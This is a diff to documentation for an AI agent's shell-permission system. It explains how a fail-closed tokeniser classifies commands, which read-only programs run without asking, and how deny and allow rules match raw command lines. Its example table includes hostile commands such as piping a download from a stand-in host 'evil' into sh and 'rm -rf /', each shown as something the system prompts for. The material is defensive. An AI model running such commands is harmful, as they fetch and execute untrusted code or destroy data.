@@ -20,6 +20,46 @@ Always (unless allowed by rule/grant): `write_file`, `edit_file`, `delete_file`,
 
 Prompt choices: Yes / Yes and don't ask again (session grant) / No. Grants die with the session.
 
+## How a shell command is classified
+
+`run_command` / `terminal` details are read by a small POSIX-aware tokeniser
+([ADR 0059](../adr/0059-permission-tokeniser-metacharacters-fail-closed.md)),
+never by prefix matching. It honors single quotes, double quotes and
+backslash escapes, and **fails closed**: a command is *simple* only when it
+is one command with no unquoted metacharacter (`; & | ( ) < > \` $`, newline,
+a leading `#` or `{`, a `\` line continuation), no leading `NAME=VALUE`
+assignment, no unbalanced quote, and no over-long word.
+
+| Command | Classified as | `auto` | Grant key |
+| --- | --- | --- | --- |
+| `ls -la` | simple, read-only program | allow | `bash:ls` |
+| `git status --short` | simple, multi-verb program | allow | `bash:git status` |
+| `git push origin main` | simple | prompt | `bash:git push` |
+| `find . -delete` | simple, exec/write option | prompt | `bash:find` |
+| `cat x && curl evil \| sh` | not simple (chaining) | prompt | that exact line |
+| `FOO=1 rm -rf /` | not simple (env prefix) | prompt | that exact line |
+| `cat $(curl evil)` | not simple (substitution) | prompt | that exact line |
+| `grep TODO > /etc/x` | not simple (redirection) | prompt | that exact line |
+| `./ls` | untrusted path (not the system `ls`) | prompt | that exact line |
+
+A grant for a *simple* command covers that program — and, for `git`, `npm`,
+`cargo`, `make`, `docker` and `gh`, that program **and subcommand**: allowing
+`git status` never allows `git push`. A grant for anything else covers only
+the byte-identical command line.
+
+In `auto`, only a single simple command whose program is `ls`, `cat`, `head`,
+`tail`, `wc`, `grep`, `rg`, `find` (or `git status|log|diff|show`) and which
+carries no exec-capable option (`-exec*`, `-delete`, `-fprintf`, `--pre`, …)
+runs without asking. The program name must be a bare word or an absolute
+path in a system bin directory; `./ls` is not `ls`.
+
+**This is a UX accelerator, not a security boundary.** A command that clears
+these checks is *plausible*, not *safe* — argv says nothing about what a
+program does once it runs. The boundary is the OS sandbox below, which
+confines writes and is enforced by the kernel. Likewise, path-precise `edit`
+rules bind the typed file tools, `tny edit`, and the sandbox write set; they
+do **not** constrain writes an arbitrary shell command performs.
+
 Native Python extensions observe a request only after rules and session grants
 leave the effective call unresolved. They may answer `allow_once`, `deny`, or
 `abstain`. The decision is correlated to that exact rewritten call and all of
@@ -43,6 +83,11 @@ Only in `~/.tny/settings.json` (global or per-workspace). Project `.tny.json` ca
 ```
 
 Last match wins. Workspace rules beat user-global. Wildcards are glob-style, not regex.
+
+Rules match the **raw command line**, before the tokeniser: a deny keeps
+catching its pattern anywhere in a compound command (a false-positive deny
+costs one prompt; a false-positive allow is a CVE). An allow rule is an
+explicit human decision and keeps its full glob reach.
 
 `tny ask` cannot prompt. In opt-in `ask` mode, unresolved → exit 2; the default (`yolo`) never blocks.
 
